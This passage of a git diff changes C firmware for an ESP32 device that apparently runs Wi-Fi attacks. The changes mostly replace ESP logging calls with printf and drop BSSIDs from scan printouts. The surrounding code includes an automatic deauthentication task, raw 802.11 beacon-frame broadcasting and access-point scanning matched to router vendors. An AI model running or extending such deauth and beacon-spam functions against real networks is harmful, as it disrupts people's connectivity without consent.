             amplitude = fmaxf(0.0f, fminf(amplitude, 1.0f)); // Clamp between 0.0 and 1.0
@@ -1367,14 +1431,14 @@ void animate_led_based_on_amplitude(void *pvParameters)
         
         esp_err_t ret = rgb_manager_set_color(&rgb_manager, 0, red, green, blue, false);
         if (ret != ESP_OK) {
-            ESP_LOGE(TAG, "Failed to set color");
+            printf("Failed to set color\n");
         }
 
         vTaskDelay(10 / portTICK_PERIOD_MS);
     }
 
     if (sock != -1) {
-        ESP_LOGE(TAG, "Shutting down socket...");
+        printf("Shutting down socket...\n");
         shutdown(sock, 0);
         close(sock);
     }
@@ -1397,31 +1461,30 @@ void rgb_visualizer_server_task(void *pvParameters) {
 
         int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
         if (sock < 0) {
-            ESP_LOGE(TAG, "Unable to create socket: errno %d", errno);
+            printf("Unable to create socket: errno %d\n", errno);
             break;
         }
-        ESP_LOGI(TAG, "Socket created");
+        printf("Socket created\n");
 
         int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
         if (err < 0) {
-            ESP_LOGE(TAG, "Socket unable to bind: errno %d", errno);
+            printf("Socket unable to bind: errno %d\n", errno);
         }
-        ESP_LOGI(TAG, "Socket bound, port %d", UDP_PORT);
+        printf("Socket bound, port %d\n", UDP_PORT);
 
         while (1) {
-            ESP_LOGI(TAG, "Waiting for data");
+            printf("Waiting for data\n");
             struct sockaddr_in6 source_addr;
             socklen_t socklen = sizeof(source_addr);
             int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                                (struct sockaddr *)&source_addr, &socklen);
 
             if (len < 0) {
-                ESP_LOGE(TAG, "recvfrom failed: errno %d", errno);
+                printf("recvfrom failed: errno %d\n", errno);
                 break;
             } else {
                 // Data received
                 rx_buffer[len] = 0; // Null-terminate
-                ESP_LOGI(TAG, "Received %d bytes", len);
 
                 // Process the received data
                 uint8_t *amplitudes = (uint8_t *)rx_buffer;
@@ -1431,7 +1494,7 @@ void rgb_visualizer_server_task(void *pvParameters) {
         }
 
         if (sock != -1) {
-            ESP_LOGE(TAG, "Shutting down socket and restarting...");
+            printf("Shutting down socket and restarting...\n");
             shutdown(sock, 0);
             close(sock);
         }
@@ -1464,20 +1527,20 @@ void wifi_auto_deauth_task(void* Parameter)
         if (ap_count > 0) {
             scanned_aps = malloc(sizeof(wifi_ap_record_t) * ap_count);
             if (scanned_aps == NULL) {
-                ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+                printf("Failed to allocate memory for AP info\n");
                 return;
             }
 
             ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, scanned_aps));
 
-            ESP_LOGI(TAG, "Found %d access points", ap_count);
+            printf("Found %d access points\n", ap_count);
         } else {
-            ESP_LOGI(TAG, "No access points found");
+            printf("No access points found\n");
         }
 
         wifi_ap_record_t *ap_info = scanned_aps;
         if (ap_info == NULL) {
-            ESP_LOGE(TAG, "Failed to allocate memory for AP info");
+            printf("Failed to allocate memory for AP info\n");
             return;
         }
 
@@ -1500,7 +1563,7 @@ void wifi_auto_deauth_task(void* Parameter)
 
 void wifi_manager_auto_deauth()
 {
-    ESP_LOGI(TAG, "Starting auto deauth transmission...");
+    printf("Starting auto deauth transmission...\n");
     wifi_auto_deauth_task(NULL);
 }               
 
@@ -1508,8 +1571,8 @@ void wifi_manager_auto_deauth()
 void wifi_manager_stop_deauth()
 {
     if (beacon_task_running) {
-        ESP_LOGI(TAG, "Stopping deauth transmission...");
-        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...");
+        printf("Stopping deauth transmission...\n");
+        TERMINAL_VIEW_ADD_TEXT("Stopping deauth transmission...\n");
         if (deauth_task_handle != NULL) {
             vTaskDelete(deauth_task_handle);
             deauth_task_handle = NULL;
@@ -1520,56 +1583,60 @@ void wifi_manager_stop_deauth()
             ap_manager_start_services();
         }
     } else {
-        ESP_LOGW(TAG, "No deauth transmission is running.");
+        printf("No deauth transmission is running.\n");
     }
 }
 
 // Print the scan results and match BSSID to known companies
 void wifi_manager_print_scan_results_with_oui() {
-
     if (scanned_aps == NULL) {
-        ESP_LOGE(TAG, "AP information not available");
+        printf("AP information not available\n");
         return;
     }
 
-    ESP_LOGI(TAG, "Found %u access points:", ap_count);
+    printf("Found %u access points:\n", ap_count);
 
     for (uint16_t i = 0; i < ap_count; i++) {
         char ssid_temp[33];
         memcpy(ssid_temp, scanned_aps[i].ssid, 32);
         ssid_temp[32] = '\0';
 
-        
         const char *ssid_str = (strlen(ssid_temp) > 0) ? ssid_temp : "Hidden Network";
-
 
         ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
         const char* company_str = "Unknown";
         switch (company) {
-            case COMPANY_DLINK: company_str = "DLink"; break;
-            case COMPANY_NETGEAR: company_str = "Netgear"; break;
-            case COMPANY_BELKIN: company_str = "Belkin"; break;
-            case COMPANY_TPLINK: company_str = "TPLink"; break;
-            case COMPANY_LINKSYS: company_str = "Linksys"; break;
-            case COMPANY_ASUS: company_str = "ASUS"; break;
+            case COMPANY_DLINK:     company_str = "DLink"; break;
+            case COMPANY_NETGEAR:   company_str = "Netgear"; break;
+            case COMPANY_BELKIN:    company_str = "Belkin"; break;
+            case COMPANY_TPLINK:    company_str = "TPLink"; break;
+            case COMPANY_LINKSYS:   company_str = "Linksys"; break;
+            case COMPANY_ASUS:      company_str = "ASUS"; break;
             case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
-            default: company_str = "Unknown"; break;
+            default:                company_str = "Unknown"; break;
         }
 
-        
-        ESP_LOGI(TAG, "[%u] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, RSSI: %d, Company: %s",
-                i,
-                ssid_str,
-                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
-                scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-                scanned_aps[i].rssi, company_str);
+        // Print access point information without BSSID
+        printf(
+            "[%u] SSID: %s,\n"
+            "     RSSI: %d,\n"
+            "     Company: %s\n",
+            i,
+            ssid_str,
+            scanned_aps[i].rssi,
+            company_str
+        );
 
-        TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, RSSI: %d, Company: %s",
-                i,
-                ssid_str,
-                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
-                scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-                scanned_aps[i].rssi, company_str);
+        // Log information in terminal view without BSSID
+        TERMINAL_VIEW_ADD_TEXT(
+            "[%u] SSID: %s,\n"
+            "     RSSI: %d,\n"
+            "     Company: %s\n",
+            i,
+            ssid_str,
+            scanned_aps[i].rssi,
+            company_str
+        );
     }
 }
 
@@ -1646,7 +1713,7 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
 
         esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, packet, packet_size, false);
         if (err != ESP_OK) {
-            ESP_LOGE(TAG, "Failed to send beacon frame: %s", esp_err_to_name(err));
+            printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
             return err;
         }
 
@@ -1659,8 +1726,8 @@ esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
 void wifi_manager_stop_beacon()
 {
     if (beacon_task_running) {
-        ESP_LOGI(TAG, "Stopping beacon transmission...");
-        TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...");
+        printf("Stopping beacon transmission...\n");
+        TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...\n");
         if (beacon_task_handle != NULL) {
             vTaskDelete(beacon_task_handle);
             beacon_task_handle = NULL;
@@ -1669,7 +1736,7 @@ void wifi_manager_stop_beacon()
         rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
         ap_manager_start_services();
     } else {
-        ESP_LOGW(TAG, "No beacon transmission is running.");
+        printf("No beacon transmission is running.\n");
     }
 }
 
@@ -1700,28 +1767,28 @@ void wifi_manager_connect_wifi(const char* ssid, const char* password)
     // Attempt to connect to the Wi-Fi network
     int retry_count = 0;
     while (retry_count < 5) {
-        ESP_LOGI(TAG, "Attempting to connect to Wi-Fi (Attempt %d/%d)...", retry_count + 1, 5);
-        TERMINAL_VIEW_ADD_TEXT("Attempting to connect to Wi-Fi (Attempt %d/%d)...", retry_count + 1, 5);
+        printf("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, 5);
+        TERMINAL_VIEW_ADD_TEXT("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, 5);
         
         int ret = esp_wifi_connect();
         if (ret == ESP_OK) {
-            ESP_LOGI(TAG, "Connecting...");
-            TERMINAL_VIEW_ADD_TEXT("Connecting...");
+            printf("Connecting...\n");
+            TERMINAL_VIEW_ADD_TEXT("Connecting...\n");
             vTaskDelay(5000 / portTICK_PERIOD_MS);  // Wait for 5 seconds
             
             // Check if connected to the AP
             wifi_ap_record_t ap_info;
             if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
-                ESP_LOGI(TAG, "Successfully connected to Wi-Fi network: %s", ap_info.ssid);
-                TERMINAL_VIEW_ADD_TEXT("Successfully connected to Wi-Fi network: %s", ap_info.ssid);
+                printf("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
+                TERMINAL_VIEW_ADD_TEXT("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
                 break;
             } else {
-                ESP_LOGW(TAG, "Connection failed or timed out, retrying...");
+                printf("Connection failed or timed out, retrying...\n");
             }
         } else {
-            ESP_LOGE(TAG, "esp_wifi_connect() failed: %s", esp_err_to_name(ret));
+            printf("esp_wifi_connect() failed: %s\n", esp_err_to_name(ret));
             if (ret == ESP_ERR_WIFI_CONN) {
-                ESP_LOGW(TAG, "Already connected or connection in progress.");
+                printf("Already connected or connection in progress.\n");
             }
         }
         retry_count++;
@@ -1729,8 +1796,8 @@ void wifi_manager_connect_wifi(const char* ssid, const char* password)
 
     // Final status after retries
     if (retry_count == 5) {
-        TERMINAL_VIEW_ADD_TEXT("Failed to connect to Wi-Fi after %d attempts", 5);
-        ESP_LOGE(TAG, "Failed to connect to Wi-Fi after %d attempts", 5);
+        TERMINAL_VIEW_ADD_TEXT("Failed to connect to Wi-Fi after %d attempts\n", 5);
+        printf("Failed to connect to Wi-Fi after %d attempts\n", 5);
     }
 }
 
@@ -1778,15 +1845,15 @@ void wifi_beacon_task(void *param) {
 void wifi_manager_start_beacon(const char *ssid) {
     if (!beacon_task_running) {
         ap_manager_stop_services();
-        ESP_LOGI(TAG, "Starting beacon transmission...");
-        TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...");
+        printf("Starting beacon transmission...\n");
+        TERMINAL_VIEW_ADD_TEXT("Starting beacon transmission...\n");
         configure_hidden_ap();
         esp_wifi_start();
         xTaskCreate(wifi_beacon_task, "beacon_task", 2048, (void *)ssid, 5, &beacon_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
     } else {
-        ESP_LOGW(TAG, "Beacon transmission already running.");
-        TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.");
+        printf("Beacon transmission already running.\n");
+        TERMINAL_VIEW_ADD_TEXT("Beacon transmission already running.\n");
     }
 }
